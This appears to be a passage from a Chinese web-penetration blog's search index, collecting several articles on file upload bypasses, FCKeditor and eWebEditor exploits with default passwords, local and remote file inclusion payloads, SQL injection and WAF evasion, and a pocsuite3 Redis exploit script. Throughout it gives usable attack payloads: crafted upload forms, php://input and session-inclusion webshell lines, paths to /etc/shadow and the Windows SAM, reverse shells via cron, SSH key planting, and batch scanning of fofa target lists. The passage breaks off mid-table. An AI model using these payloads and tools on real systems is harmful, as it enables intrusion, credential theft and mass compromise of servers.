注意，文件名必须相同，访问任意php文件即可生效\n\n\n00截断\n前提： 1、php版本小于5.3.4 2、php的magic_quotes_gpc为OFF状态\n抓包 POST包： 1.php+.jpg，将+的数值改为十六进制的00 GET包： 1.php%00，存在上传路径时，也可在上传路径后用此方法截断\n\n\nHTTP PUT方法\n前提：开启PUT服务 探测： telnet 192.168.139.136 80 OPTIONS / HTTP/1.1 HOST:172.16.132.161 利用： telnet 192.168.139.136 80 PUT /infoa.php HTTP/1.1 HOST: 192.168.139.136 Content-Length: 18\n开启PUT服务： 1、开启Dav（conf配置文件）–取消注释 LoadModule dav_module modules/mod_dav.so LoadModule dav_fs_module modules/mod_dav_fs.so 2、启用Dav DocumentRoot-Directory下新增DAV On 3、开启文件锁 配置文件首部新增 DavLockDB c:\\phpstudy\\www\\DavLock 新增DavLock文件夹（上面写的路径） 重启apache服务\n\n\n五、编辑器漏洞常见文本编辑器\nFCKeditor、Ewebeditor、Ueditor、KindEditor、XHeditor\n1、FCKeditor漏洞漏洞版本\n\n\n\n版本\n漏洞说明\n\n\n\nVersion2.2版本\nApache+linux环境下在上传文件后面加个.突破\n\n\nVersion&lt;=2.4.2\nforphp上传的地方并未对Media类型进行上传文件类型的控制，导致用户上传任意文件\n\n\nVersion&lt;=v2.4.3\nFCKeditor被动限制策略所导致的过滤不严问题较高版本FCKeditor文件上传“.”变“_”下划线\n\n\n方法\n\n\n\n方法\n说明\n\n\n\n查看编辑器\n/fckeditor/editor/dialog/fck_about.html /fckeditor/_whatsnew.html\n\n\nFCKeditor中test文件的上传地址\nfckeditor/editor/filemanager/connectors/test.html fckeditor/editor/filemanager/connectors/uploadtest.html fckeditor/editor/filemanager/browser/default/connectors/test.html fckeditor/editor/filemanager/upload/test.html\n\n\n&gt;2.4.3版本绕过\n在fckeditor/editor/filemanager/connectors/test.html下 同时创建两个x.asp文件夹，一级目录可绕过.转义成_，从而在一级目录a.asp下上传图片马，进行解析\n\n\n2、Ewebeditor编辑器漏洞Ewebeidtor编辑器的默认信息\n\n\n\n说明\n路径\n\n\n\n默认数据库路径：\n/db/ewebeditor.mdb /db/db.mdb /db/%23ewebeditor.mdb\n\n\n默认密码：\nadmin/admin/888或admin/admin进入后台，也可尝试admin/123456/admin888\n\n\n系统默认：\newebeditor.asp?id=content1&amp;style=standards\n\n\n默认管理地址：\n2.80以前：ewebeditor/admin_login.asp；以后版本：admin/login.aspEwebeditor\n\n\n漏洞类型\n\n\n\n说明\n\n\n\n\n1.关键文字的名称和路径\n登录页面Admin_Login.asp Admin_Default.asp 管理首页Admin_UploadFile.asp Upload.asp\n\n\n2.默认用户名密码\n账号密码基本是默认的admin/admin（admin888）\n\n\n3.下载数据库\n默认数据库/db/ewebeditor.mdb或者/db/ewebeditor.asp\n\n\n4.文件上传\n\n\n\n5.遍历路径\n\n\n\n6.Cookie漏洞\n\n\n\n利用\n1、登录后台，进入样式管理，增加上传类型即可。\n2、访问/admin/ewebEditor/asp/upload.asp?action=save&amp;type=image&amp;style=popup&amp;cusdir=hack.asp\n创建hack.asp文件夹，此文件夹下文件全部可执行\n检查元素，编辑html\n&lt;form action=&quot;http://192.168.1.1/admin/ewebEditor/asp/upload.asp?\t\taction=save&amp;type=image&amp;style=popup&amp;cusdir=hack.asp&quot; method=post name=myform enctype=&quot;multipart/form-data&quot;&gt;&lt;input type=file name=uploadfile size=100&gt;&lt;br&gt;&lt;br&gt;&lt;input type=submit value=upload&gt;&lt;/form&gt;\n\n新增上传窗口，上传图片马，查看源码即可获得文件路径。\n","categories":["Web渗透"],"tags":["文件上传"]},{"title":"文件包含漏洞","url":"/article/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/","content":"一、简介程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某个函数的时候，直接调用此文件，无需再次编写，这种调用文件的过程通常称为文件包含。但是如果未对动态调用的变量做出限制（如同SQL注入漏洞一样，未对客户端输入进行过滤，从而造成违背开发人员本意的语句执行–这里是指调用了恶意文件），客户端可以调用任意文件，则造成了文件包含漏洞。\n大多数Web语言都可以使用文件包含操作，其中PHP语言所提供的文件包含功能太强大、太灵活。所以包含漏经常出现在PHP语言中，在JSP/ASP/ASP.net程序中比较少。\n二、文件包含函数常见函数\n\n\n\n函数\n说明\n\n\n\ninclude()\n找不到被包含的文件时只产生警告，脚本将继续执行\n\n\ninclude_once()\n此语句和include()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含\n\n\nrequire()\n找不到被包含的文件时会产生致命错误，并停止脚本\n\n\nrequire_once()\n此语句和require()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含\n\n\nrequire()和include()函数的区别：\n使用require()函数包含文件时，只要程序执行，立即调用文件，而include()只有程序执行到该函数时才调用。\n其它函数：\nhighlight_file()、show_source()、readfile()、file_get_contents()、fopen()、file()等\n三、文件包含分类1、本地文件包含–LFI可以读取和打开本地文件\n前提：\n1、allow_url_fopen=On（php.ini中进行配置，该选项默认为On）\n2、用户可以动态控制变量\n利用：\n1、获取到系统中的其他文件的内容\n绝对路径：?action=C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts\n相对路径：?action=..\\..\\..\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts\n包含图片马：\n/action.php?action=test.jpg\n包含日志文件：\n文件路径\n访问日志：\taccess_log（在Windows上是access.log）\t错误日志：\terror_log（在Windows上是error.log）\t默认安装路径：\tCentOS、Redhat、Fedora:/var/log/httpd/\tUbuntu、Debian、Kali:/var/log/apache2/源码安装路径：\t/usr/local/apache2/logs/\t具体可通过配置文件查看与更改\t/etc/httpd/conf/httpd.conf\n\n注意：\n1、使用日志文件包保证文件内有且只有一对脚本语言的标签，可以在零点时使用。\n2、使用bp抓包写入，防止出现编码问题。\n包含session：\n文件路径\n默认：/var/lib/php/session、/var/lib/php5/session等可以通过phpinfo查看，session.save_path（受版本影响）\n\nsession名构成：\nsess_[phpsessid]，phpsessid 在客户端存储信息cookie中可看到。\n通过代码审计或传入、包含构造的session文件进行利用\n利用代码（类似的源码或者自己构造）&lt;?phpsession_start();$shell=$_GET[&#x27;shell&#x27;];$_SESSION[&quot;username&quot;]=$shell;?&gt;\n\n利用\n/shell.php?cmd=&lt;?php phpinfo();?&gt;\t\t#写入一句话xx.php?file=/var/lib/php5/session/sess_xxxxxxx\t\t#文件包含利用\n\n绕过\n代码环境\n#  增加指定后缀  &lt;?php  $filename=$_GET[&#x27;filename&#x27;];  include($filename.&quot;php&quot;);  ?&gt;  \n\n\n\n\n方法\n说明\n\n\n\n%00截断\n前提： 1、magic_quotes_gpc=Off 2、php版本&lt;5.3.4 用法： ?action=phpinfo.php%00\n\n\n路径长度截断\n前提： 1、Windows下要长于256字节，超出的部分会被丢弃 2、Linux下要长于4096字节，超出的部分会被丢弃。 用法： ?action=phpinfo.php../../../../…\n\n\n点号截断\n前提： windows系统，点号需要长于256 用法： ?action=phpinfo.php……….\n\n\n其他\n增加前缀： 相对路径、绝对路径绕过  增加后缀 ： 伪协议绕过  过滤../：使用…/.绕过，过滤一次还剩下../ …\n\n\n2、远程文件包含–RFI能够包含远程服务器上的文件并执行，可以通过http(s)或者ftp等方式，远程加载文件\n前提：\n1、allow_url_include=On（默认为OFF，需要在php.ini中手动打开）\n2、allow_url_fopen=On（是否允许打开远程文件）\n3、用户可以动态控制变量\n利用——伪协议\n\n\n\n协议\n利用\n\n\n\nfile://\n访问本地文件系统 使用条件： allow_url_fopen：off/on allow_url_include：off/on file: //协议在两个配置都为off的情况下是可以正常使用的  使用方法： file: //文件的绝对路径和文件名 [?path=file://c:\\windows\\System32\\drivers\\etc\\hosts]\n\n\nphp://\n访问各个输入/输出流 php://filter 使用条件： allow_url_fopen：off/on allow_url_include：off/on 两个配置都为off的情况下是可以正常使用的  使用： [?path=php://filter/read=convert.base64-encode/resource=文件.php] 注意：通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码。虽然不能直接获取到shell，但能读取敏感文件。  php://filter协议与file://协议的区别：file协议只能使用绝对路径，filter协议相对路径和绝对路径都可以使用PHP伪协议  php://input 用途： 可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行 使用条件： allow_url_fopen：off/on allow_url_include：on 使用方法： ?file=php://input[POST]： (执行POST DATA中的内容)\n\n\nzip://\n用途： 读取zip压缩包内容 使用条件： allow_url_fopen = off/on allow_rul_include=off/on 使用方法： ?file=zip://D:/soft/phpstudy/www/file.zip%23phpcode.txt 若是zip后缀被禁用，可直接改zip后缀为jpg后缀，继续使用zip协议访问\n\n\nphar://\n压缩协议，使用同zip协议 ?file=phar://D:/soft/phpstudy/www/file.jpg%23phpcode.txt\n\n\ndata://\n?file=data://text/plain, 或 ?file=data://text/plain;base64,base64编码数据\n\n\nhttp://\n访问HTTP(S)网址 ?path=http://ip/info.php\n\n\nftp://\n访问FTP(S) URLS ?path=ftp://用户名:密码@ip/info.php\n\n\n绕过\n\n\n\n方法\n说明\n\n\n\n问号绕过\n?在url中是用来连接第一个变量的（多个变量使用&amp;连接） ?action=http://192.168.152.143/phpinfo.php?\n\n\n#号绕过\n#在url中是定位符，跳转至指定文件的#标记（相当于搜索），需要url编码 ?action=http://192.168.152.143/phpinfo.php%23\n\n\n空格绕过\nwindows特性 ?action=http://192.168.152.143/phpinfo.php%20\n\n\npython自定义响应包绕过\n在服务器端使用python开启http服务，定制响应体，可绕过远程文件包含限制 python -m http.server 8000 python RFIServer.py 下载地址： https://www.zerochen.top/download/RFI/RFIServer.py\n\n\n四、常见的敏感信息路径Windows系统\nc:\\boot.ini \t\t\t\t\t\t\t\t\t# 查看系统版本c:\\windows\\system32\\inetsrv\\MetaBase.xml \t\t# IIS配置文件C:\\windows\\system32\\config\\sam \t\t\t\t\t# 存储Windows系统初次安装的密码c:\\ProgramFiles\\mysql\\my.ini \t\t\t\t\t# MySQL配置c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD \t\t# MySQL root密码c:\\windows\\php.ini \t\t\t\t\t\t\t\t# php 配置信息\n\nLinux/Unix系统\n/etc/passwd \t\t\t\t\t\t\t\t# 账户信息/etc/shadow \t\t\t\t\t\t\t\t# 账户密码文件/usr/local/app/apache2/conf/httpd.conf \t\t# Apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhost.conf \t\t\t# 虚拟网站配置/usr/local/app/php5/lib/php.ini \t\t\t# PHP相关配置/etc/httpd/conf/httpd.conf \t\t\t\t\t# Apache配置文件/etc/my.conf \t\t\t\t\t\t\t\t# mysql 配置文件\n","categories":["Web渗透"],"tags":["文件包含"]},{"title":"SQL注入思路整理","url":"/article/SQL%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/","content":"一、简介本篇只介绍思路，不做详细注入语句讲解。\n二、SQL注入产生原因用户输入处理不当，用户数据被当做SQL语句执行。\n三、注入类型\n\n\n分类标准\n分类\n\n\n\n根据请求方式分类\nGET方式注入 POST方式注入\n\n\n根据注入点参数分类\n整数型注入 字符型注入 搜索型注入\n\n\n根据反馈类型分类\nunion联合查询注入 报错注入 布尔盲注 时间盲注 其他类型 （如请求头注入、内联注入、二次编码注入、宽字节注入、堆叠注入、二阶注入等）\n\n\n根据数据库类型分类\nMysql、MSSql、Oracle、Access、MongoDB等\n\n\n四、SQL注入思路1、发现注入点注入点\n所有存在可变参数且代入数据库中执行的数据\n如：url中的?id=、页面中的搜索框、POST数据包中的可变参数、数据头中的UA、X-Forward-For等\n判断：\n在参数后加单引号、双引号、斜杠&#39;、&quot;、\\，全部加。\n若页面异常，则可能存在注入；\n若页面无变化，则使用延时函数，判断是否存在时间延时盲注（各大数据库通用）；其中，在mysql数据库中，需要额外判断宽字节注入、二次编码注入。若页面存在延时刷新、报错，可能存在sql注入。\n2、判断闭合符使用不报错的闭合符（&#39;或&quot;）,加上注释符（不同数据库不同，但-- a几乎可以通用：mysql中为–空格,mssql和oracle为–，access无注释符号）\n注意：\nmysql为?id=1&#39; -- a形式\nmssql、oracle、access均为?id=1&#39; and 1=1/1=2 --形式（1=1正常、1=2异常）\n若页面返回正常，则单或双引号即为闭合符；若页面依然异常，则在单或双引号后添加)，直至页面恢复正常。添加部分与单或双引号组成闭合符。\n注意：需要结合语境，判断可能使用的sql语句，更加容易判断闭合符。如搜索型语句处（多存在搜索框处），可能会使用like关键词，需要使用%闭合，构造形如%&#39;and &#39;%&#39;=&#39;的闭合语句进行闭合判断。\n3、判断数据库类型在进行注入前，需要判断数据库类型，从而选择合适的注入语句。使用每个数据库独有的一个或多个语法、函数进行判断。\n简单列举，够用即可。\n\n\n\n数据库类型\n注释\n函数\n\n\n\nmysql\n– a\nversion()、@@version、length()\n\n\nmssql\n–\n@@version、len()、?id=1’ and exists (select * from sysobjects)&gt;0 – 返回正常\n\n\noracle\n–\nbanner from sys.v_$version、length()\n\n\naccess\n无\nand exists (select * from msysobjects)&gt;0 返回正常\n\n\n注：注释处为两个英文输入法的短横杠，非单横杠（显示问题）\n4、选择注入方式根据页面回显情况，选择通用注入方式：\n1&gt;首选union联合查询。要求：有回显位。\n2&gt;次选报错注入。要求：页面异常为报错信息。\n3&gt;最后是盲注。若页面只有正常和单一异常两种回显，选择布尔盲注；若页面无回显，选择时间盲注。\n5、结合WAF确定注入语句结合4，同一处注入点可以有多重注入手法，若是没有waf，按照优先级进行选择即可。若是有waf，需要结合绕waf选择注入方式。同时，在判断时，也可以尝试绕waf。\n1&gt;首先，判断and、or、空格是否存在waf拦截。\n2&gt;然后，按照注入手法优先级，将用到的关键词（如：order by、union select等）单独放入注入语句进行判断。\n优先绕过waf，其次换可替代的关键词、最后换注入方式。\n3&gt;最后，根据waf拦截方式，确定注入语句，依次注出当前数据库名、表名、字段名、数据即可。文末附上常见绕waf方式。\n注意：\n若为mysql数据库，可进行以下判断\n--os-shell可对网站进行getshell，但是存在以下前提条件1、存在sql注入2、知道网站绝对路径3、拥有数据库权限（dba权限），也可以使用sqlmap的--is-dba判断4、数据库配置文件secure_file_priv未设置或设置为可读写的已知路径\n\n4&gt;其他：\n时间延时盲注可用DNS外带节省注入时间，放在其他文章中再做讲述。\n五、SQL注入防御\n\n\n方式\n说明\n\n\n\n去掉单引号\n现实场景常用单引号，去掉不合实际\n\n\n转义单引号\n对数字型无效（数字型不需要引号） 斜杠转义 addslashes()函数转义 php.ini配置文件转义（5.6以下版本开启magic_quotes_gpc = On）\n\n\n强制类型转换\n针对数字型 intval()\n\n\n更改数据库连接方式\nPOD连接数据库将变量转换成字符串，再写入数据库，无法拼接\n\n\n六、WAF绕过sql语法特性 + http特性 + waf缺陷 = waf绕过\n1、大小写绕过（现今几乎无效）\n2、替换关键字1&gt; 关键字双写（代码级别waf有效）2&gt; 同价词替换，针对特殊关键词拦截的情况\nand --&gt; &amp;&amp;or --&gt; ||= --&gt; &lt;、&gt;空格 --&gt; %20、%09、%0a、%0b、%0c、%0d、%a0、//\n\n 3&gt; 特殊字符拼接（mssql支持拼接、mysql不支持拼接）​ ‘test1’+’test2’​3、编码绕过常见的sql编码有unicode、hex、url、ascii、base64等​ 1&gt;url编码（或者二次编码）​ 2&gt;unicode编码（改/为%）​ 常见unicode编码​ 单引号：%u0027​ 空格：%u0020​ 左括号：%u0028​ 右括号：%u0029​4、注释绕过利用语言函数特性来绕过waf规则常见注释符：//、--、//、#、--+、---、;、--a​ 1&gt;普通注释​ /**/在构造查询中插入注释，规避对空格的依赖或关键字识别​ 2&gt;内联注释​ /*!*/表示注释里面的语句会被执行（只有MYSQL能识别）​ /*!50001 select * from test*/表示数据库5.00.01以上版本才会执行该语句​5、参数污染当同一参数出现多次，不同中间件会解析为不同结果。如果WAF只检测了同名参数中的第一个或最后一个，并且中间件特征正好取与WAF相反的参数，则可成功绕过\n\n\n\n服务器中间件\n解析结果\n举例\n\n\n\nASP.NET/IIS\n所有出现的参数值用逗号连接\npar1=var1,val2\n\n\nASP/IIS\n所有出现的参数值用逗号连接\npar1=var1,var2\n\n\nPHP/Apache\n仅最后一次出现的参数值\npar1=var2\n\n\nJSP/Tomcat\n仅最后一次出现的参数值\npar1=val1\n\n\nPerl CGI/Apache\n仅第一次出现参数值\npar1=var1\n\n\n如：\n/index.aspx?id=select 1,2,3 from table--&gt;/index.aspx?id=select 1&amp;id=,2,3 from table\n\n6、缓冲区溢出许多WAF是C语言写的，而C语言本身没有缓冲区保护机制，如果WAF在处理测试向量时超出了其缓冲区长度，会引发bug从而实现绕过如：\n?id=1 and (select 1)=(select 0xAAAAAA*1000 more A)+union select 1,2version()-- a\n\n7、整合绕过绕过技术结合使用\n8、分块传输绕过burpsuite中更实用post传输数据，设置Transfer-encoding: chunked使用换行分割数据\n","categories":["Web渗透"],"tags":["SQL注入"]},{"title":"Pocsuite3重写redis脚本","url":"/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/","content":"声明本脚本只做学习使用，请勿用作非法用途！\n简介结合pocsuite3所学，重写redis漏洞复现。内含PoC模块、attack模块和shell模块。密码爆破功能请继续使用旧版本：redis.py\n其中，shell模式下会报错，但是不影响命令写入和反弹shell（反弹sell需要手动监听6666端口–pocsuite默认监听端口）。这里的报错导致脚本本身的监听出错了，只要手动开启监听就可以。\n[ERROR] thread MainThread: &#x27;NoneType&#x27; object has no attribute &#x27;params&#x27;Traceback (most recent call last):  File &quot;c:\\python\\python39\\lib\\site-packages\\pocsuite3\\lib\\core\\threads.py&quot;, line 47, in run_threads    thread_function(*args)  File &quot;c:\\python\\python39\\lib\\site-packages\\pocsuite3\\lib\\controller\\controller.py&quot;, line 148, in task_run    result = poc_module.execute(target, headers=conf.http_headers, mode=conf.mode, verbose=False)  File &quot;c:\\python\\python39\\lib\\site-packages\\pocsuite3\\lib\\core\\poc.py&quot;, line 229, in execute    output.params = self.paramsAttributeError: &#x27;NoneType&#x27; object has no attribute &#x27;params&#x27;\n\n搜了一下，应该是某个值为空，然后空值被调用了，导致报错。但是我的shell里面没写空值，看报错，也都是系统函数报错的，盲猜可能是不会使用pocsuite3的shell模块导致的。有了解的大佬请留言指正，感谢！\n\n分割线 2021-08-14\n\n修复反弹shell空值报错；优化attack模块，改写脚本为ssh连接\n使用须知：\nattack模式下：需要redis-cli客户端命令安装：\twget http://download.redis.io/redis-stable.tar.gz #下载redis-cli\ttar -zxvf redis-stable.tar.gz\tcd redis-stable \tmake \tcp src/redis-cli /usr/bin/需要提前在本地生成公钥文件方法：\t1、ssh-keygen -t rsa  生成密钥（管理员权限）\t2、(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; key.txt\t3、在公钥目录执行命令，并将key.txt移动到脚本目录\t注：windows在用户目录/.ssh下，linux在/root/.ssh/下\n\n\n\n\n分割线 2021-08-19\n\n由于漏洞太老了，实战中虽然存在不少空密码、弱口令，但是几乎全做了权限限制，无法写入公钥、定时任务（这个还收服务器类型限制）。于是增加版本检测功能，搭配 宝er 魔改的redis-rogue-server工具使用，可低权限进入4.x-5.0.5命令执行，然后提权。\n使用过程：\n1、--verify     验证模式\npocsuite -r _89715_redis_login_bypass.py -u 192.168.21.237 --verify\n\n \n2、--shell    反弹shell\npocsuite -r _89715_redis_login_bypass.py -u 192.168.21.237 --shell\n\n \n需要等待反弹shell定时任务生效，约1分钟\n \nlist:列出反弹shell列表use:使用指定反弹shell\n\n\n\n3、ssh连接\npocsuite -r _89715_redis_login_bypass.py -u 192.168.21.237 --attack\n\n \n执行ssh root@192.168.21.237，成功无密码连接靶机\n \n可搭配fofa搜索，导出目标列表，批量验证。\npocsuite -r _89715_redis_login_bypass.py -f ./test.txt --threads 20 --verify\n\n \n警告！\nshell、attack模式严禁用于非法用途，仅做本地测试及pocsuite编写学习！\n下载地址：\n旧版（爆破功能）\nhttps://www.zerochen.top/download/Redis/redis.py\n新版（pocsuite3模块）\nhttps://www.zerochen.top/download/Redis/89715_redis_login_bypass.py\nhttps://www.zerochen.top/download/Redis/_89715_redis_login_bypass.py\n","categories":["Python"],"tags":["Redis"]},{"title":"Pocsuite3使用","url":"/article/Pocsuite3%E4%BD%BF%E7%94%A8/","content":"命名规则漏洞应用名_版本号_漏洞类型名称 \n\n（所有字母均为小写,所有的符号改成_）\n例：\n88979_cmseasy_5_5_sql_injection.py\n\n模板#导入所写PoC所需要类/文件，尽量不要使用第三方模块。#迫不得已使用第三方模块有其依赖规则，后面给出。from pocsuite3.api import Output,POCBase,register_poc,requests#PoC实现类，继承POCBaseclass DemoPoc(POCBase):\t#PoC信息字段，需要完整填写全部下列信息\tvulID = &#x27;1000&#x27;  \t\t\t\t\t# ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0    version = &#x27;1&#x27; \t\t\t\t\t\t# 默认为1    author = &#x27;chen&#x27; \t\t\t\t\t# PoC作者的大名    vulDate = &#x27;2014-10-16&#x27; \t\t\t\t# 漏洞公开的时间,不知道就写今天    createDate = &#x27;2014-10-16&#x27;\t\t\t# 编写PoC的日期    updateDate = &#x27;2014-10-16&#x27;\t\t\t# PoC更新的时间,默认和编写时间一样    references = [&#x27;https://www.sektioneins.de/en/blog/14-10-15-drupal-sql-injection-vulnerability.html&#x27;]    \t\t\t\t\t\t\t\t\t# 漏洞地址来源,0day不用写    name = &#x27;Drupal 7.x /includes/database/database.inc SQL注入漏洞 PoC&#x27;\t\t\t# PoC名称    appPowerLink = &#x27;https://www.drupal.org/&#x27;\t\t\t# 漏洞厂商主页地址    appName = &#x27;Drupal&#x27;\t\t\t\t\t\t\t\t\t# 漏洞应用名称    appVersion = &#x27;7.x&#x27;\t\t\t\t\t\t\t\t\t# 漏洞影响版本    vulType = &#x27;SQL Injection&#x27;\t\t\t\t\t\t\t# 漏洞类型,类型参考见 漏洞类型规范表    desc = &#x27;&#x27;&#x27;    \t漏洞简要描述    &#x27;&#x27;&#x27;     samples = []\t\t\t\t\t\t\t\t\t\t# 测试样列,就是用 PoC 测试成功的网站    install_requires = [] \t# PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写    #第三方插件需再此处注明   \t# 整个字段的值为list，每个项为一个依赖模块   \t# install_requires =[str_item_,str_item,…]    \t# 如果遇到安装时模块名与调用时的不一致情况，用:分割开   \t# 例如常见的加密算法库pycryptodome,但是调用是以from Crypto.Cipher import AES,此时就需要如下填写\t# install_requires = [&#x27;pycryptodome:Crypto&#x27;]   \tpocDesc = &#x27;&#x27;&#x27;    \t\tpoc的用法描述    \t&#x27;&#x27;&#x27;   \t     \t#编写验证模式\tdef _verify(self):        output = Output(self)        result = &#123;&#125;        # 验证代码        if x:        \tresult[&#x27;VerifyInfo&#x27;]=&#123;&#125;            result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = target            result[&#x27;VerifyInfo&#x27;][&#x27;Postdata&#x27;] = payload            ...        return self.parse_output(result)\t\t# 必须返回result         #编写攻击模式    #若没有攻击模式，直接写return self._verify()即可    def _attack(self):    \toutput = Output(self)    \tresult = &#123;&#125;    \t# 攻击代码    \tif x:        \tresult[&#x27;VerifyInfo&#x27;]=&#123;&#125;            result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = target            result[&#x27;VerifyInfo&#x27;][&#x27;Postdata&#x27;] = payload            ...        return self.parse_output(result)\t\t# 必须返回result                    #编写shell模式    def _shell(self):    \tcmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())    \t# 攻击代码 execute cmd        #自定义输出函数，调用框架输出的实例Output\tdef parse_output(self,result):        output = Output(self)        if result:            output.success(result)        else:            output.fail(&#x27;target is not vulnerable&#x27;)        return outputregister_poc(DemoPoc)\n\n常用命令# 使用test.py这个PoC去检测http://test.com这个urlpocsuite -u http://test.com -r test.py --verify # shell 反弹模式pocsuite -u http://test.com -r test.py --verify --shell # pocsuite3中自带的ecshop poc中实现了自定义命令`command`,可以从外部参数传递pocsuite -u http://test.com -r ecshop_rce.py --attack --command &quot;whoami&quot; #使用test.py这个PoC去检测url.txt文件里所有的urlpocsuite -f url.txt -r test.py --verify \n\nResult结果参数说明result：[    &#123;  name: &#x27;DBInfo&#x27;，        value：&#x27;数据库内容&#x27; &#125;，        &#123;  name: &#x27;Username&#x27;，      value: &#x27;管理员用户名&#x27;&#125;,        &#123;  name: &#x27;Password&#x27;，      value：&#x27;管理员密码&#x27; &#125;，        &#123;  name: &#x27;Salt&#x27;，          value: &#x27;加密盐值&#x27;&#125;,        &#123;  name: &#x27;Uid&#x27;，           value: &#x27;用户ID&#x27;&#125;,        &#123;  name: &#x27;Groupid&#x27;，       value: &#x27;用户组ID&#x27;&#125;,    &#123;  name: &#x27;ShellInfo&#x27;，     value: &#x27;Webshell信息&#x27;&#125;,        &#123;  name: &#x27;URL&#x27;，           value: &#x27;Webshell地址&#x27;&#125;,        &#123;  name: &#x27;Content&#x27;，       value: &#x27;Webshell内容&#x27;&#125;,    &#123;  name: &#x27;FileInfo&#x27;，      value: &#x27;文件信息&#x27;&#125;,        &#123;  name: &#x27;Filename&#x27;，      value: &#x27;文件名称&#x27;&#125;,        &#123;  name: &#x27;Content&#x27;，       value: &#x27;文件内容&#x27;&#125;,    &#123;  name: &#x27;XSSInfo&#x27;，       value: &#x27;跨站脚本信息&#x27;&#125;,        &#123;  name: &#x27;URL&#x27;，           value: &#x27;验证URL&#x27;&#125;,        &#123;  name: &#x27;Payload&#x27;，       value: &#x27;验证Payload&#x27;&#125;,    &#123;  name: &#x27;AdminInfo&#x27;，     value: &#x27;管理员信息&#x27;&#125;,        &#123;  name: &#x27;Uid&#x27;，           value: &#x27;管理员ID&#x27;&#125;,        &#123;  name: &#x27;Username&#x27;，      value: &#x27;管理员用户名&#x27;&#125;,        &#123;  name: &#x27;Password&#x27;，      value: &#x27;管理员密码&#x27;&#125;,    &#123;  name: &#x27;Database&#x27;，      value：&#x27;数据库信息&#x27; &#125;，        &#123;  name: &#x27;Hostname&#x27;，      value: &#x27;数据库主机名&#x27;&#125;,        &#123;  name: &#x27;Username&#x27;，      value：&#x27;数据库用户名&#x27; &#125;，        &#123;  name: &#x27;Password&#x27;，      value: &#x27;数据库密码&#x27;&#125;,        &#123;  name: &#x27;DBname&#x27;，        value: &#x27;数据库名&#x27;&#125;,    &#123;  name: &#x27;VerifyInfo&#x27;，    value: &#x27;验证信息&#x27;&#125;,        &#123;  name: &#x27;Target&#x27;，        value: &#x27;验证host:port&#x27;&#125;,        &#123;  name: &#x27;URL&#x27;，           value: &#x27;验证URL&#x27;&#125;,        &#123;  name: &#x27;Postdata&#x27;，      value: &#x27;验证POST数据&#x27;&#125;,        &#123;  name: &#x27;Path&#x27;，          value: &#x27;网站绝对路径&#x27;&#125;,    &#123;  name: &#x27;SiteAttr&#x27;，      value: &#x27;网站服务器信息&#x27;&#125;,    &#123;  name: &#x27;Process&#x27;，       value: &#x27;服务器进程&#x27;&#125;    ]\n\n通用方法\n\n\n方法\n说明\n\n\n\nfrom pocsuite3.api import logger\n日志记录，比如logger.log(info)\n\n\nfrom pocsuite3.api import requests\n请求类，用法同 requests\n\n\nfrom pocsuite3.api import Seebug\nSeebug api 调用\n\n\nfrom pocsuite3.api import ZoomEye\nZoomEye api 调用\n\n\nfrom pocsuite3.api import CEye\nCeye api 调用\n\n\nfrom pocsuite3.api import crawl\n简单爬虫功能\n\n\nfrom pocsuite3.api import PHTTPServer\nHttp服务功能\n\n\nfrom pocsuite3.api import REVERSE_PAYLOAD\n反向连接shell payload\n\n\nfrom pocsuite3.api import get_results\n获取结果\n\n\n漏洞类型规范\n\n\n英文名称\n中文名称\n缩写\n\n\n\nCross Site Scripting\n跨站脚本\nxss\n\n\nCross Site Request Forgery\n跨站请求伪造\ncsrf\n\n\nSQL Injection\nSql注入\nsql-inj\n\n\nLDAP Injection\nldap注入\nldap-inj\n\n\nMail Command Injection\n邮件命令注入\nsmtp-inj\n\n\nNull Byte Injection\n空字节注入\nnull-byte-inj\n\n\nCRLF Injection\nCRLF注入\ncrlf-inj\n\n\nSSI Injection\nSsi注入\nssi-inj\n\n\nXPath Injection\nXpath注入\nxpath-inj\n\n\nXML Injection\nXml注入\nxml-inj\n\n\nXQuery Injection\nXquery 注入\nxquery-inj\n\n\nCommand Execution\n命令执行\ncmd-exec\n\n\nCode Execution\n代码执行\ncode-exec\n\n\nRemote File Inclusion\n远程文件包含\nrfi\n\n\nLocal File Inclusion\n本地文件包含\nlfi\n\n\nAbuse of Functionality\n功能函数滥用\nfunc-abuse\n\n\nBrute Force\n暴力破解\nbrute-force\n\n\nBuffer Overflow\n缓冲区溢出\nbuffer-overflow\n\n\nContent Spoofing\n内容欺骗\nspoofing\n\n\nCredential Prediction\n证书预测\ncredential-prediction\n\n\nSession Prediction\n会话预测\nsession-prediction\n\n\nDenial of Service\n拒绝服务\ndos\n\n\nFingerprinting\n指纹识别\nfinger\n\n\nFormat String\n格式化字符串\nformat-string\n\n\nHTTP Response Smuggling\nhttp响应伪造\nhttp-response-smuggling\n\n\nHTTP Response Splitting\nhttp响应拆分\nhttp-response-splitting\n\n\nHTTP Request Splitting\nhttp请求拆分\nhttp-request-splitting\n\n\nHTTP Request Smuggling\nhttp请求伪造\nhttp-request-smuggling\n\n\nHTTP Parameter Pollution\nhttp参数污染\nhpp\n\n\nInteger Overflows\n整数溢出\nint-overflow\n\n\nPredictable Resource Location\n可预测资源定位\nres-location\n\n\nSession Fixation\n会话固定\nsession-fixation\n\n\nURL Redirector Abuse\nurl重定向\nredirect\n\n\nPrivilege Escalation\n权限提升\nprivilege-escalation\n\n\nResolve Error\n解析错误\nresolve-error\n\n\nArbitrary File 